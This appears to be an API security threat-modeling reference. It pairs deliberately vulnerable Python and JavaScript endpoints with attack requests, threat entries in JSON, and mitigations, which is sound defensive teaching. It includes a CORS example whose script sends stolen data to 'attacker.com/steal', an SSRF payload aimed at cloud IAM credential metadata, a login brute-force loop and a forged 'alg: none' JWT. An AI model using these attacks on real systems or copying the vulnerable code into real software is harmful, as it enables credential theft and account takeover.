# API Security Threat Modeling Examples

Real-world threat scenarios for REST and GraphQL APIs.

## BOLA Examples

### Example 1: Order Retrieval IDOR

**Vulnerable Code:**
```python
@app.route('/api/orders/<int:order_id>')
@jwt_required()
def get_order(order_id):
    # VULNERABLE: No ownership check
    order = Order.query.get_or_404(order_id)
    return jsonify(order.to_dict())
```

**Attack:**
```http
GET /api/orders/12345
Authorization: Bearer <user_B_token>
```
User B retrieves User A's order by guessing/enumerating IDs.

**Threat Output:**
```json
{
  "id": "THREAT-001",
  "category": "Information Disclosure",
  "title": "BOLA: Unauthorized Order Access",
  "description": "Order endpoint returns any order by ID without verifying the requesting user owns the order",
  "severity": "high",
  "affected_components": ["/api/orders/{id}", "get_order()"],
  "attack_scenario": "Attacker enumerates order IDs to access other customers' orders containing PII and purchase history",
  "api_category": "API1:2023 BOLA",
  "vulnerability_types": ["CWE-639", "CWE-284"],
  "mitigation": "Add ownership filter: Order.query.filter_by(id=order_id, user_id=current_user.id).first_or_404()"
}
```

### Example 2: Document Update BOLA

**Vulnerable Code:**
```javascript
app.put('/api/documents/:id', authenticate, async (req, res) => {
  // VULNERABLE: Updates any document
  await Document.findByIdAndUpdate(req.params.id, req.body);
  res.json({ success: true });
});
```

**Secure Version:**
```javascript
app.put('/api/documents/:id', authenticate, async (req, res) => {
  const doc = await Document.findOneAndUpdate(
    { _id: req.params.id, owner: req.user.id },  // Ownership check
    req.body
  );
  if (!doc) return res.status(404).json({ error: 'Not found' });
  res.json({ success: true });
});
```

---

## Mass Assignment Examples

### Example 3: Role Escalation via Mass Assignment

**Vulnerable Code:**
```python
@app.route('/api/users/<int:user_id>', methods=['PUT'])
@jwt_required()
def update_user(user_id):
    user = User.query.get_or_404(user_id)
    # VULNERABLE: Accepts all fields from request
    for key, value in request.json.items():
        setattr(user, key, value)
    db.session.commit()
    return jsonify(user.to_dict())
```

**Attack:**
```http
PUT /api/users/123
Content-Type: application/json

{
  "name": "John",
  "email": "john@example.com",
  "role": "admin",           // Injected!
  "is_verified": true        // Injected!
}
```

**Threat Output:**
```json
{
  "id": "THREAT-002",
  "category": "Elevation of Privilege",
  "title": "Mass Assignment Enables Role Escalation",
  "description": "User update endpoint blindly applies all request fields to user model, allowing attackers to modify protected fields like 'role' and 'is_verified'",
  "severity": "critical",
  "affected_components": ["/api/users/{id}", "User model"],
  "attack_scenario": "User includes 'role': 'admin' in profile update request, gaining administrative privileges",
  "api_category": "API3:2023 BOPLA",
  "vulnerability_types": ["CWE-915"],
  "mitigation": "Use allowlist: allowed = {'name', 'email', 'phone'}; for key in allowed & request.json.keys(): setattr(user, key, request.json[key])"
}
```

---

## Excessive Data Exposure Examples

### Example 4: User List Exposes Sensitive Data

**Vulnerable Code:**
```python
@app.route('/api/users')
@jwt_required()
def list_users():
    users = User.query.all()
    # VULNERABLE: Returns all fields including sensitive ones
    return jsonify([u.to_dict() for u in users])

class User:
    def to_dict(self):
        return {
            'id': self.id,
            'email': self.email,
            'name': self.name,
            'password_hash': self.password_hash,  # Exposed!
            'ssn': self.ssn,                      # Exposed!
            'internal_notes': self.internal_notes # Exposed!
        }
```

**Secure Version:**
```python
def to_public_dict(self):
    return {
        'id': self.id,
        'name': self.name,
        'email': self.email  # Only public fields
    }
```

---

## Authentication Examples

### Example 5: JWT Algorithm Confusion

**Vulnerable Code:**
```python
@app.route('/api/protected')
def protected():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    # VULNERABLE: verify=False or accepts 'none' algorithm
    payload = jwt.decode(token, options={"verify_signature": False})
    return jsonify({'user': payload['user']})
```

**Attack:**
```
# Modify JWT header to alg: none
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

**Threat Output:**
```json
{
  "id": "THREAT-003",
  "category": "Spoofing",
  "title": "JWT Signature Verification Disabled",
  "description": "API decodes JWT tokens without signature verification, allowing attackers to forge tokens with arbitrary claims",
  "severity": "critical",
  "affected_components": ["authentication middleware", "jwt.decode()"],
  "attack_scenario": "Attacker creates JWT with 'alg: none' and 'user: admin' claim to impersonate admin",
  "api_category": "API2:2023 Broken Authentication",
  "vulnerability_types": ["CWE-287", "CWE-347"],
  "mitigation": "Always verify: jwt.decode(token, SECRET_KEY, algorithms=['HS256'])"
}
```

### Example 6: No Rate Limiting on Login

**Vulnerable Code:**
```python
@app.route('/api/auth/login', methods=['POST'])
def login():
    # VULNERABLE: No rate limiting
    email = request.json.get('email')
    password = request.json.get('password')
    user = User.query.filter_by(email=email).first()
    if user and user.check_password(password):
        return jsonify({'token': create_token(user)})
    return jsonify({'error': 'Invalid credentials'}), 401
```

**Attack Script:**
```python
for password in password_list:
    r = requests.post('/api/auth/login', json={'email': 'admin@company.com', 'password': password})
    if r.status_code == 200:
        print(f'Found: {password}')
        break
```

---

## GraphQL Examples

### Example 7: Introspection Enabled in Production

**Vulnerable Configuration:**
```python
app.add_url_rule('/graphql', view_func=GraphQLView.as_view(
    'graphql',
    schema=schema,
    graphiql=True  # VULNERABLE: GraphiQL + introspection in prod
))
```

**Attack:**
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}
```

**Threat Output:**
```json
{
  "id": "THREAT-004",
  "category": "Information Disclosure",
  "title": "GraphQL Introspection Exposes Full Schema",
  "description": "GraphQL introspection enabled in production allows attackers to discover all types, queries, mutations, and field definitions",
  "severity": "medium",
  "affected_components": ["/graphql endpoint", "schema definition"],
  "attack_scenario": "Attacker queries __schema to map entire API surface, discovering hidden admin mutations and sensitive fields",
  "api_category": "API9:2023 Improper Inventory Management",
  "vulnerability_types": ["CWE-200"],
  "mitigation": "Disable introspection in production: graphene.Schema(query=Query, auto_camelcase=False, introspection=False)"
}
```

### Example 8: GraphQL Query Depth Attack

**Vulnerable Schema:**
```graphql
type User {
  id: ID!
  friends: [User!]!  # Circular reference
  posts: [Post!]!
}

type Post {
  author: User!  # Circular reference
  comments: [Comment!]!
}
```

**Attack Query:**
```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          posts {
            author {
              friends {
                posts {
                  comments { ... }  # Exponential depth
                }
              }
            }
          }
        }
      }
    }
  }
}
```

---

## SSRF Examples

### Example 9: Webhook URL SSRF

**Vulnerable Code:**
```python
@app.route('/api/webhooks', methods=['POST'])
@jwt_required()
def register_webhook():
    url = request.json.get('url')
    # VULNERABLE: No URL validation
    # Test webhook by making request
    response = requests.get(url)  # SSRF!
    return jsonify({'status': 'registered'})
```

**Attack:**
```http
POST /api/webhooks
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

**Threat Output:**
```json
{
  "id": "THREAT-005",
  "category": "Information Disclosure",
  "title": "SSRF via Webhook Registration",
  "description": "Webhook URL is fetched server-side without validation, allowing attackers to probe internal networks and cloud metadata services",
  "severity": "critical",
  "affected_components": ["/api/webhooks", "requests.get()"],
  "attack_scenario": "Attacker registers webhook pointing to AWS metadata endpoint, exfiltrating IAM credentials",
  "api_category": "API7:2023 SSRF",
  "vulnerability_types": ["CWE-918"],
  "mitigation": "Validate URL against allowlist, block internal IPs, use URL parsing to verify scheme and host"
}
```

---

## CORS Misconfiguration Examples

### Example 10: Wildcard CORS with Credentials

**Vulnerable Code:**
```python
from flask_cors import CORS

# VULNERABLE: Wildcard origin with credentials
CORS(app, origins="*", supports_credentials=True)
```

**Attack:**
```javascript
// On attacker's site
fetch('https://api.victim.com/api/user/me', {
  credentials: 'include'  // Sends victim's cookies
})
.then(r => r.json())
.then(data => {
  // Exfiltrate victim's data
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```

**Threat Output:**
```json
{
  "id": "THREAT-006",
  "category": "Information Disclosure",
  "title": "CORS Misconfiguration Enables Cross-Origin Data Theft",
  "description": "API allows any origin with credentials, enabling malicious sites to make authenticated requests and steal user data",
  "severity": "high",
  "affected_components": ["CORS configuration", "all API endpoints"],
  "attack_scenario": "Attacker hosts page that fetches victim's private data from API using their session cookies",
  "api_category": "API8:2023 Security Misconfiguration",
  "vulnerability_types": ["CWE-942", "CWE-346"],
  "mitigation": "Specify allowed origins explicitly: CORS(app, origins=['https://app.company.com'], supports_credentials=True)"
}
```

---

## Broken Function Level Authorization

### Example 11: Admin Endpoint Without Role Check

**Vulnerable Code:**
```python
@app.route('/api/admin/users', methods=['DELETE'])
@jwt_required()  # Only checks authentication, not authorization!
def delete_all_users():
    User.query.delete()
    db.session.commit()
    return jsonify({'status': 'all users deleted'})
```

**Attack:**
```http
DELETE /api/admin/users
Authorization: Bearer <regular_user_token>
```

**Threat Output:**
```json
{
  "id": "THREAT-007",
  "category": "Elevation of Privilege",
  "title": "Admin Endpoint Accessible to Regular Users",
  "description": "The DELETE /api/admin/users endpoint only checks for authentication but not admin role, allowing any authenticated user to delete all users",
  "severity": "critical",
  "affected_components": ["/api/admin/users", "delete_all_users()"],
  "attack_scenario": "Regular user discovers admin endpoint via API enumeration and deletes all users",
  "api_category": "API5:2023 BFLA",
  "vulnerability_types": ["CWE-285", "CWE-862"],
  "mitigation": "Add role check: @admin_required or if not current_user.is_admin: abort(403)"
}
```

